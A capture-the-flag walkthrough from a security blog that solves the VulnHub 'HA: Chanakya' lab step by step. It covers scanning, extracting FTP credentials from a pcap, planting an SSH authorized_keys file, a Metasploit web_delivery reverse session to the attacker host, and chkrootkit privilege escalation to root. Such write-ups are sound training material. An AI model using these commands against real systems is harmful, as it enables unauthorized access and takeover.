<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">HA: Chanakya Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ha-chanakya-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-11-27T15:24:45+00:00">November 27, 2019</time><time class="updated" datetime="2025-06-10T20:10:54+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve our Boot to Root challenge called “HA Chanakya”. We have developed this lab for the purpose of online penetration practices. It is based on the Mastermind that took down kingdoms, one and only Chanakya. Let’s Solve it!!</span></p>
<p><span style="color: #000000;"><strong>Download <a style="color: #000000;" href="https://www.vulnhub.com/entry/ha-chanakya,395/">Here</a></strong></span></p>
<p><span style="color: #000000;"><strong>Level: Intermediate</strong></span></p>
<p><span style="color: #000000;"><strong>Task:</strong> To Enumerate the Target Machine and Get the Root Access.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Getting FTP Login Credentials</span></li>
<li><span style="color: #000000;">FTP Login</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Creating Authorized keys to login via SSH</span></li>
<li><span style="color: #000000;">Transferring keys through FTP</span></li>
<li><span style="color: #000000;">Logging via SSH</span></li>
<li><span style="color: #000000;">Reading Chkrootkit logs</span></li>
<li><span style="color: #000000;">Getting a reverse connection</span></li>
<li><span style="color: #000000;">Spawning a TTY Shell</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Chkrootkit</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">After downloading, run the Machine in VMWare Workstation. To work on the machine, we will be needing its IP Address. For this, we will be using the netdiscover command. After matching the MAC and IP Address we found the Virtual Machine IP Address to be 192.168.1.101.</span></p>
<pre class="lang:default decode:true ">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-GKnZymNDj8U/Xd6QC4SceoI/AAAAAAAAhrg/o84C8q2PWI4LPf6iBlpUPXRRdjPcB2FjgCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">Now that we have the Target Machine IP Address, our next logical step would be to do a port scan on the target to get information about the various services that are running on the target machine. After the Aggressive Scan of all the ports, we see that we have the SSH service (22), HTTP service (80), FTP service (21) running on the Target Machine.</span></p>
<pre class="lang:default decode:true ">nmap -A 192.168.1.101</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BWBPGtgQjB8/Xd6QFh8-Z4I/AAAAAAAAhr0/QVUa558S6BQSPwNNuNwIQtoOr8sfNLP7gCLcBGAsYHQ/s1600/2.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Moving on, we observed that we have the HTTP service running. It is probable that a web page is hosted. So, we decided to take a look through our Web Browser. We did thorough browsing of the webpage. We went through its source code and images, but there was no way in or any hint.</span></p>
<pre class="lang:default decode:true ">http://192.168.1.101</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-p-gY1erJBds/Xd6QGTmV2UI/AAAAAAAAhr8/buH4f4g0Yv82YbH0qX5sliZuHD4hUpJdwCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">Till now we didn’t find any hint to establish our foothold, therefore we chose DIRB for directory brute force attack and Luckily found abuse.txt. After finding the abuse.txt, we decided to download this file to our attacker system for a close inspection. We used the wget command to download this file. Upon opening the file, we see that it contains some text that doesn’t make much sense. It must be encrypted.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.101/ -X .txt
abuse.txt
wget http://192.168.1.101/abuse.txt
cat abuse.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JLBrfEgEeFE/Xd6QGV810TI/AAAAAAAAhr4/GzOMNFZiGSUfLf1phnWc6-WmO_P0qn0ZwCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">After searching on the Internet for a while we found that ROT13 resembles to the text we found. So, we decided to decode the text using the ROT13 Decrypter found <a style="color: #000000;" href="https://rot13.com/">here</a>.  When we decrypted the encoded text to be the name of a packet capture file. Let’s find this file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-u3hZdIr_g54/Xd6QGZMd1JI/AAAAAAAAhsA/rse5ey6foF4BLN1rRsAJ3sMZN3q37smWACLcBGAsYHQ/s1600/5.png"/></p>
<pre class="lang:default decode:true">ashoka.pcapng</pre>
<p><span style="color: #000000;">We decide to run the wget command directly on the IP Address in a hope that the packet capture file would be in the /var/www/html/ directory. Our suspicion was correct, the file was swiftly downloaded in our attacker machine. After downloading to inspect the file, we decided to inspect the file using Wireshark.</span></p>
<pre class="lang:default decode:true ">wget http://192.168.1.101/ashoka.pcapng
wireshark ashoka.pcapng</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vqzOz1KPT8I/Xd6QHTjqwtI/AAAAAAAAhsE/ct4Hme9bHV4GGFjnNpNe3m-fv3VEUiBqwCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">Opened the captured file in Wireshark, followed the tcp stream of ftp traffic and got one username ashoka and password kautilya.</span></p>
<pre class="lang:default decode:true ">User: ashoka
Pass: kautilya</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TbqC737rvcI/Xd6QHlvyYuI/AAAAAAAAhsI/11Xtwvg_pdopg3vSf35eRw7gMO_F8xFdwCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">Now that we have the FTP login credentials, we logged into the FTP Server. After logging in we ran the ls command to look around. We found ourselves in the root directory. So, we decided to make our way through ssh with placing the keys at this location. For that, we created a directory named “.ssh”. After traversing in this newly created directory we went back to our native terminal.</span></p>
<pre class="lang:default decode:true ">ftp 192.168.1.101
ashoka
kautilya
ls -la
mkdir .ssh
cd .ssh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-uYeQeXXUdq4/Xd6QH4qIOmI/AAAAAAAAhsM/S8dTvnRHX5cpRlBTMX4fWeGU6IQkzxgmQCLcBGAsYHQ/s1600/8.png"/></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">Now time to generate some ssh keys. We used ssh-keygen to create some keys. We entered the password as “123”. This can be anything of your choice. We kept it so that it’s easy to remember. Moving on after the key is created, we moved into the .shh directory on our native shell. Here we saw that we have the key named “id_rsa.pub”. Now we need to upload this key to FTP so we copied the contents of the is_rsa.pub in the file named authorized_keys.</span></p>
<pre class="lang:default decode:true ">ssh-keygen
cd .ssh
ls
cat id_rsa.pub &gt; authorized_keys
ls</pre>
<p> </p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XlZcKZKykeM/Xd6QIZgugiI/AAAAAAAAhsQ/MmE4nuS4Wh0y3bzV6RySC3enItzN-GN2gCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">We moved the authorized_keys to the home directory so that it is easier to transfer the file using the File Transfer Protocol. Now using the put command we transferred the file to the target machine.</span></p>
<pre class="lang:default decode:true ">put authorized_keys
ls</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mq4WD405kRA/Xd6QCxsoDDI/AAAAAAAAhrY/lPapbD4wRKwSJG7ypXsde9rzgAo8GMLswCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">Now we will be connecting to the target machine using the ssh. It will be possible to login now due to the authorized keys we placed earlier. We got a shell of the Ashoka user. After some enumeration, we see that we have a logs file inside the temp file. We tried to take a look at it using the cat command.  It definitely looks like a Chkrootkit test results log. This is clue that we might be able to escalate privileges on this machine using Chkrootkit.</span></p>
<pre class="lang:default decode:true ">ssh ashoka@192.168.1.101
ls /tmp
cat /tmp/logs</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1FpyUQYc-VU/Xd6QC6o14YI/AAAAAAAAhrc/XuxpUGs1__IUjlTzopig29CcVxL7iIUxACLcBGAsYHQ/s1600/11.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now to Escalate Privileges on the target machine, we are going to need a meterpreter on the target machine which we are going to use get root with the help of the Metasploit. To do this we decided to take a meterpreter using the web_delivery exploit. First, we selected the web_delivery exploit with the help of use command followed by providing the lhost. Lhost is the IP Address of our target machine (Kali Linux). In the end, we will type in exploit. This will create a one-line script for us that will give us a meterpreter over the target machine.</span></p>
<pre class="lang:default decode:true ">use exploit/multi/script/web_delivery
set lhost 192.168.1.107
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ja8faZmEXO4/Xd6QECaK2rI/AAAAAAAAhrk/_7agcv5PMlElUJAT2SFkCyvyj6Mqng6qACLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">We copied the said command generated by the exploit and ran over the ssh session we got earlier.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-zs_pRlXp5Qk/Xd6QEexS46I/AAAAAAAAhro/yUWlMA6xjK4kR24EhP-vQUjvN-JYMXmwwCLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">This gave us the session we required to work. We are going to use the inbuilt exploit in the Metasploit that could help us get root shell over the target machine. We selected the session and provide the port for another session. After typing in exploit we see that the exploit is working and it gave us another shell over the port mentioned earlier.</span></p>
<pre class="lang:default decode:true ">use exploit/unix/local/chkrootkit
set session 1
set lport 8888
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nZLurUKZR5c/Xd6QElr9rWI/AAAAAAAAhrs/kw7-Mr1gdckma314PhEaJNGEgiRMQZlXgCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">To convert the shell into a proper working shell, we ran the python one-liner to spawn a TTY shell. We looked around and found a text file name final.txt, we opened it to find the final flag. We did it. This concludes this lab.</span></p>
<pre class="lang:default decode:true ">python -c 'import pty;pty.spawn("/bin/bash")'
ls
cat final.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hPYq1ZI_VBk/Xd6QFARVelI/AAAAAAAAhrw/dRcvUsUmFz4RPaG8tKjMZGdEbMSWEfmgwCLcBGAsYHQ/s1600/15.png"/></p>
<p><strong>Author: </strong>Pavandeep Singh is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on Twitter and <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">LinkedIn</a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
